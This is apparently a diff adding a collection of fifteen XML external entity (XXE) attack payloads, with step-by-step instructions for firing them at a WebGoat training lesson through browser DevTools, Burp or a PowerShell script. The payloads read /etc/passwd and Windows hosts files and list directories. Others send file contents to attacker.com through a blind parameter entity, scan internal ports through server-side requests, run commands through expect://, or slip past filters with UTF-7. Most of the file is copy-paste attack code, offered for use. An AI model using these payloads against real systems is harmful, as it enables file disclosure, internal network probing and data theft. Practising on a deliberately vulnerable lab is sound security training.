@@ -1,0 +1,271 @@
+====================================================================
+XXE PAYLOADS COLLECTION
+====================================================================
+
+Copy and paste these payloads into the comment field or modify
+the XML request in DevTools/Burp Suite.
+
+====================================================================
+1. LIST ROOT DIRECTORY (Linux)
+====================================================================
+
+<?xml version="1.0"?>
+<!DOCTYPE comment [
+  <!ENTITY xxe SYSTEM "file:///">
+]>
+<comment>
+  <text>&xxe;</text>
+</comment>
+
+--------------------------------------------------------------------
+
+Alternative (if above doesn't work):
+
+<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>
+
+====================================================================
+2. READ /etc/passwd (Linux)
+====================================================================
+
+<?xml version="1.0"?>
+<!DOCTYPE comment [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<comment>
+  <text>&xxe;</text>
+</comment>
+
+====================================================================
+3. READ /etc/hosts (Linux)
+====================================================================
+
+<?xml version="1.0"?>
+<!DOCTYPE comment [
+  <!ENTITY xxe SYSTEM "file:///etc/hosts">
+]>
+<comment>
+  <text>&xxe;</text>
+</comment>
+
+====================================================================
+4. LIST C:\ DRIVE (Windows)
+====================================================================
+
+<?xml version="1.0"?>
+<!DOCTYPE comment [
+  <!ENTITY xxe SYSTEM "file:///c:/">
+]>
+<comment>
+  <text>&xxe;</text>
+</comment>
+
+====================================================================
+5. READ Windows hosts file
+====================================================================
+
+<?xml version="1.0"?>
+<!DOCTYPE comment [
+  <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
+]>
+<comment>
+  <text>&xxe;</text>
+</comment>
+
+====================================================================
+6. COMPACT FORMAT (if XML declaration causes issues)
+====================================================================
+
+<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>
+
+====================================================================
+7. WITH DIFFERENT ROOT ELEMENT NAMES
+====================================================================
+
+Try if "comment" doesn't work:
+
+<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///">]><data><text>&xxe;</text></data>
+
+<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///">]><root>&xxe;</root>
+
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///">]><foo>&xxe;</foo>
+
+====================================================================
+8. PARAMETER ENTITY (for blind XXE)
+====================================================================
+
+<?xml version="1.0"?>
+<!DOCTYPE comment [
+  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%xxe;'>">
+  %eval;
+  %exfil;
+]>
+<comment>
+  <text>test</text>
+</comment>
+
+====================================================================
+9. ERROR-BASED XXE
+====================================================================
+
+<!DOCTYPE comment [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+  %eval;
+  %error;
+]>
+<comment><text>test</text></comment>
+
+====================================================================
+10. SSRF VIA XXE (Internal Network Scan)
+====================================================================
+
+<!DOCTYPE comment [
+  <!ENTITY xxe SYSTEM "http://localhost:8080/">
+]>
+<comment><text>&xxe;</text></comment>
+
+Try different ports:
+- http://localhost:80/
+- http://localhost:8080/
+- http://localhost:3306/
+- http://localhost:5432/
+- http://192.168.1.1/
+
+====================================================================
+11. DATA URI (Base64 encoding bypass)
+====================================================================
+
+<!DOCTYPE comment [
+  <!ENTITY xxe SYSTEM "data://text/plain;base64,SGVsbG8gV29ybGQ=">
+]>
+<comment><text>&xxe;</text></comment>
+
+====================================================================
+12. PHP WRAPPER (if PHP backend)
+====================================================================
+
+<!DOCTYPE comment [
+  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
+]>
+<comment><text>&xxe;</text></comment>
+
+====================================================================
+13. EXPECT WRAPPER (if expect module enabled)
+====================================================================
+
+<!DOCTYPE comment [
+  <!ENTITY xxe SYSTEM "expect://id">
+]>
+<comment><text>&xxe;</text></comment>
+
+====================================================================
+14. JAR PROTOCOL (Java applications)
+====================================================================
+
+<!DOCTYPE comment [
+  <!ENTITY xxe SYSTEM "jar:file:///var/www/html/shell.jpg!/shell.php">
+]>
+<comment><text>&xxe;</text></comment>
+
+====================================================================
+15. UTF-7 ENCODING (bypass filters)
+====================================================================
+
+<?xml version="1.0" encoding="UTF-7"?>
++ADw-+ACE-DOCTYPE comment +AFs-+ADw-+ACE-ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-
+<comment><text>&xxe;</text></comment>
+
+====================================================================
+HOW TO USE THESE PAYLOADS:
+====================================================================
+
+METHOD 1: Browser DevTools (Easiest)
+-------------------------------------
+1. Open the XXE lesson in WebGoat
+2. Open DevTools (F12) → Network tab
+3. Type any comment and submit
+4. Find the POST request in Network tab
+5. Right-click → Copy → Copy as Fetch
+6. Paste in Console
+7. Modify the body to include XXE payload
+8. Run the fetch command
+
+Example:
+--------
+fetch("http://192.168.254.112:8001/WebGoat/xxe/simple", {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/xml"
+  },
+  body: '<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>'
+}).then(r => r.text()).then(console.log);
+
+
+METHOD 2: Using PowerShell Script
+----------------------------------
+.\xxe_attack.ps1 -Target root
+
+
+METHOD 3: Direct in Comment Field
+----------------------------------
+Some applications might accept DOCTYPE in the comment field directly.
+Try pasting the compact format:
+
+<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>
+
+====================================================================
+TESTING CHECKLIST:
+====================================================================
+
+✓ Try basic file read first: file:///etc/passwd
+✓ If no output, try error-based XXE
+✓ If error-based fails, try blind XXE with external server
+✓ Test different protocols: file://, http://, ftp://, etc.
+✓ Try different root elements: comment, data, root, foo
+✓ Test with/without XML declaration
+✓ Try compact vs formatted XML
+✓ Check if application accepts DOCTYPE in input field
+✓ Intercept with proxy (Burp) to modify request
+
+====================================================================
+EXPECTED RESPONSES:
+====================================================================
+
+For file:/// (root directory):
+------------------------------
+bin
+boot
+dev
+etc
+home
+lib
+root
+usr
+var
+...
+
+For /etc/passwd:
+---------------
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+
+For /etc/hosts:
+--------------
+127.0.0.1   localhost
+::1         localhost ip6-localhost ip6-loopback
+...
+
+====================================================================
+
+
+fetch("http://192.168.254.112:8001/WebGoat/xxe/simple", {
+  method: "POST",
+  credentials: "include",
+  headers: {
+    "Content-Type": "application/xml"
+  },
+  body: '<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>'
+}).then(r => r.text()).then(console.log);
